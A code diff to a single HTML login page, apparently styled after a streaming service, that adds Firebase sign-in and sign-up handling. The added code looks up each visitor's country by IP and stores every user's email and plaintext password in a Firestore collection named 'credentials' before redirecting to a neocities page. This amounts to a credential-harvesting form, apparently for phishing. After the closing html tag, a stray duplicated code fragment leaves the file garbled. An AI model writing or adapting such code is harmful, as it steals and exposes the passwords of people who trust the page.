@@ -43,7 +43,7 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
 .modal-box input { width: 100%; padding: 12px; margin-bottom: 12px; background: #222; border: none; color: #fff; border-radius: 4px; }
 .modal-box button { width: 100%; padding: 12px; background: #e50914; border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 4px; }
 .switch { margin-top: 12px; font-size: 14px; color: #aaa; cursor: pointer; text-align: center; }
-.error-msg { color: #ff4c4c; margin-bottom: 10px; font-size: 14px; text-align: center; min-height: 18px; }
+.error-msg { color: #ff4c4c; margin-bottom: 10px; font-size: 14px; text-align: center; }
 </style>
 </head>
 <body>
@@ -74,9 +74,9 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
 </div>
 
 <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/11.26.0/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.26.0/firebase-auth.js";
-import { getFirestore, doc, setDoc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.26.0/firebase-firestore.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+import { getFirestore, doc, setDoc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 // Firebase config
 const firebaseConfig = {
@@ -89,7 +89,7 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-// DOM elements
+// DOM
 const authBtn = document.getElementById("authBtn");
 const getStartedBtn = document.querySelector(".get-started");
 const modal = document.getElementById("modal");
@@ -112,6 +112,97 @@ function openAuth() {
 function toggleMode() {
   isSignup = !isSignup;
   modalTitle.textContent = isSignup ? "Sign Up" : "Sign In";
+  toggleModeBtn.textContent = isSignup ? "Already have an account? Sign in" : "Don’t have an account? Sign up";
+  errorDiv.textContent = "";
+}
+
+// Friendly error messages
+function getFriendlyError(err) {
+  switch(err.code){
+    case "auth/invalid-email": return "Please enter a valid email address.";
+    case "auth/user-not-found": return "No account found with this email. Try signing up.";
+    case "auth/wrong-password": return "Incorrect password. Please try again.";
+    case "auth/email-already-in-use": return "This email is already registered. Please sign in.";
+    case "auth/weak-password": return "Password is too weak. Use at least 6 characters.";
+    default: return "Something went wrong. Please try again.";
+  }
+}
+
+// Get user country
+async function getUserLocation(){
+  try{
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    return data.country_name || "Unknown";
+  } catch { return "Unknown"; }
+}
+
+// Save credentials to Firestore
+async function saveUserData(email, password, status, isNew=false){
+  const country = await getUserLocation();
+  const userDoc = doc(db,"credentials",email);
+  if(isNew){
+    await setDoc(userDoc,{
+      email,password,status,country,
+      createdAt: serverTimestamp(),
+      lastAction: serverTimestamp()
+    }, {merge:true});
+  } else {
+    await setDoc(userDoc,{
+      password,status,country,lastAction: serverTimestamp()
+    }, {merge:true});
+  }
+}
+
+// Submit Sign In / Sign Up
+async function submitAuth(){
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
+  if(!email || !password){
+    errorDiv.textContent = "Please fill in both email and password.";
+    return;
+  }
+  try{
+    const userDocRef = doc(db,"credentials",email);
+    const docSnap = await getDoc(userDocRef);
+    const isNew = !docSnap.exists();
+    if(isSignup){
+      await createUserWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed Up",isNew);
+    } else {
+      await signInWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed In",isNew);
+    }
+    errorDiv.style.color = "#4CAF50";
+    errorDiv.textContent = isSignup ? "Account created successfully!" : "Signed in successfully!";
+    setTimeout(()=>{ window.location.href = "https://rinolski.neocities.org/Home.html"; },1000);
+    emailInput.value="";
+    passwordInput.value="";
+  } catch(err){
+    errorDiv.style.color="#ff4c4c";
+    errorDiv.textContent = getFriendlyError(err);
+    console.error(err);
+  }
+}
+
+// Event listeners
+authBtn.addEventListener('click', openAuth);
+getStartedBtn.addEventListener('click', openAuth);
+toggleModeBtn.addEventListener('click', toggleMode);
+submitBtn.addEventListener('click', submitAuth);
+
+// Auto redirect if already signed in
+onAuthStateChanged(auth, user=>{
+  if(user){
+    if(window.location.pathname.endsWith("index.html") || window.location.pathname === "/" || window.location.pathname === "/index.html"){
+      window.location.href = "https://rinolski.neocities.org/Home.html";
+    }
+  }
+});
+</script>
+
+</body>
+</html>  modalTitle.textContent = isSignup ? "Sign Up" : "Sign In";
   toggleModeBtn.textContent = isSignup ? "Already have an account? Sign in" : "Don’t have an account? Sign up";
   errorDiv.textContent = "";
 }
